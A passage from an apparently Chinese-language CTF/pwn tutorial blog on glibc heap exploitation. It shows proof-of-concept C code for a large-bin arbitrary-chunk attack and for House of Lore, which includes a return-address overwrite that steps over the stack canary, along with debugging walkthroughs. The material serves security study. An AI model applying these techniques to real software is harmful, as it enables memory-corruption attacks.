class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;of your fake chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Misalign the location in order to use the primitive as a SIZE value.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability #2!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a &#x27;size&#x27; for our fake chunk using this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin</span></span><br><span class="line"><span class="comment">	chunk address above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The &#x27;key&#x27; to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown</span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a &#x27;heap address&#x27; at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, our &#x27;fake size&#x27; is at 0x60008 and is a valid size for the</span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Second vulnerability!!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we&#x27;ve corrupted everything in just the right</span></span><br><span class="line"><span class="comment">	way so this should work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted &#x27;bk&#x27; pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the &#x27;bk&#x27;</span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This call to malloc (if you&#x27;re lucky), will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Make allocation of the size that the value will be written for.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once the allocation happens, the madness begins&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;write a fake &#x27;size&#x27; value to the location of our target.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After this, the target will have a valid size.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;size and remove it from the bin.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;With this, we have pulled out an arbitrary chunk!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String before: %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String pointer: %p\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">	ptr = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47&quot;</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String after %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk ptr: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-13"><a href="#调试-13" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194123520.png"
                      alt="image-20231010194123520"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194223371.png"
                      alt="image-20231010194223371"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194317515.png"
                      alt="image-20231010194317515"
                ></p>
<p>首先布置堆结构，<code>get_shift_amount()</code>函数计算 <code>fake_chunk_size</code> 偏移，这个偏移一般来说，开了 <code>PIE</code> 为 <code>5</code>，不开 <code>PIE</code> 为 <code>2</code>。<code>alloc_size</code> 在经过与 <code>0xffffffffffe(111111111111111111111111111111111110)</code>取与运算后，<code>PREV_INUSE</code>位将被置为<code>0</code>，然后减去 <code>0x10</code>后变为需要申请的用户大小<code>0x50</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010195052740.png"
                     
                ></p>
<p>这里判断 <code>alloc_size</code> 是否符合要求。与 <code>0x8(1000)</code> 取与运算不为 <code>0</code> 说明不是 <code>fast_chunk</code> 大小，不符合要求； 与 <code>0x4(0100)</code> 取与运算等于<code>0x4</code> 则说明 <code>NON_MAIN_ARENA </code> 位为 <code>1</code> ，不属于主堆区，不符合要求；与 <code>0x2(0010)</code> 取与运算不等于 <code>0x2(0010)</code> 则说明 <code>IS_MAPPED</code> 位不等于为 <code>1</code> ，符合要求（绕个弯子）。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200619889.png"
                      alt="image-20231010200619889"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200749723.png"
                      alt="image-20231010200749723"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200845852.png"
                      alt="image-20231010200845852"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201137929.png"
                      alt="image-20231010201137929"
                ></p>
<p>接下来申请 <code>largebin_chunk</code> ，并将<code>unsorted_bin</code> 和 <code>large_bin</code> 两个堆块都放入 <code>unsorted bin</code> 中。再次申请 <code>0x4e8</code> 大小堆块并释放，会将 <code>0x4e1</code> 大小的堆块放入 <code>large_bin</code>，将 <code>0x4f1</code> 大小的堆块放进 <code>unsorted bin</code>，满足 <code>unsortedbin_chunk &gt; largebin_chunk</code> 并且在大小在同一区域内。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201734234.png"
                      alt="image-20231010201734234"
                ></p>
<p>接下来完成任意地址申请，我们要控制 <code>target</code> 区域，在其 <code>fake_chunk=target-0x10</code> 位置申请。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201942670.png"
                      alt="image-20231010201942670"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010202458509.png"
                      alt="image-20231010202458509"
                ></p>
<p>构建如上图的堆结构，后面解释原因。</p>
<p>此时申请一个<code>0x50</code> 大小的堆块会经过以下两个变化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);<span class="comment">// bck==fake_chunk</span></span><br></pre></td></tr></table></figure></div>

<p>即 <code>unsorted_chunks(av)-&gt;bk = fake_chunk</code>;<code>fake_chunk+0x10(fake_chunk_fd) = unsorted_chunks(av)</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* unsortedbin_chunks_size &gt; largebin_chunks_size 将执行如下代码 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      victim-&gt;fd_nextsize = fwd; <span class="comment">//victim==unsortedbin_chunk; fwd == largebin_chunk;</span></span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>然后执行如上代码，<code>unsorted_chunk_bk_nextsize</code> 首先指向 <code>fake_chunk-0x18-2</code> ，然后  <code>unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize (fake_chunk-0x18-2+0x20)</code>  改为 <code>unsorted_chunk (此时fake_chunk的size被改为0x60)</code>。然后将 <code>bck(fake_chunk+0x8) </code>的 <code> fd(fake_chunk+0x8+0x10)</code> 指向 <code>unsorted_chunk</code>，伪造了 <code>fake_chunk_bk</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010204701287.png"
                      alt="image-20231010204701287"
                ></p>
<p> 最后成功向目标位置写入内容。</p>
<h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-14"><a href="#调试-14" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201716247.png"
                      alt="image-20231012201716247"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201759897.png"
                      alt="image-20231012201759897"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201828914.png"
                      alt="image-20231012201828914"
                ></p>
<p>首先申请一个 <code>0x110</code>大小的堆块，然后布置栈上两个 <code>stack_buffer</code> 结构，即 <code>stack1_fd-&gt;small_chunk</code>，<code>stack1_bk-&gt;stack2_prev</code> ，<code>stack2_fd-&gt;stack1_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211308891.png"
                      alt="image-20231012211308891"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211034680.png"
                      alt="image-20231012211034680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211530114.png"
                      alt="image-20231012211530114"
                ></p>
<p>申请<code>0x3f0</code> 大小的 <code>chunk</code> 隔离 <code>top_chunk</code> ，然后将 <code>0x111</code> 的 <code>chunk</code> 放进 <code>unsorted_bin</code> ，申请 <code>（large_chunk）0x4c0</code> 大小的 <code>chunk</code> 触发 <code>consolidate</code> 机制再次将其再次放入 <code>small_bin</code> 中，并修改其 <code>bk-&gt;stack1_prev</code>。</p>
<p>此时：</p>
<p>FD：<code>stack2_fd-&gt;stack1_prev;stack1_fd-&gt;small_chunk_fd;</code></p>
<p>BK：<code>small_chunk_bk-&gt;stack1_prev;stack1_bk-&gt;stack2_prev;</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二种情况，small bin 中存在空闲的 chunk。</span></span><br><span class="line"><span class="comment">// 找到倒数第二个 chunk(small_chunk)-&gt;bk。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line"><span class="built_in">set_inuse_bit_at_offset</span>(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure></div>

<p>然后再次申请两个用户区为 <code>0x100</code>大小的 <code>chunk</code>，第一次申请时绕过以上验证，此时 <code>bck(stack1)_fd-&gt;small_chunk。</code>，第二次申请同理，要取出 <code>victim=stack1</code> ，此时 <code>stack_2_fd-&gt;stack_1_prev; stack1_bk-&gt;stack2_prev</code>。</p>
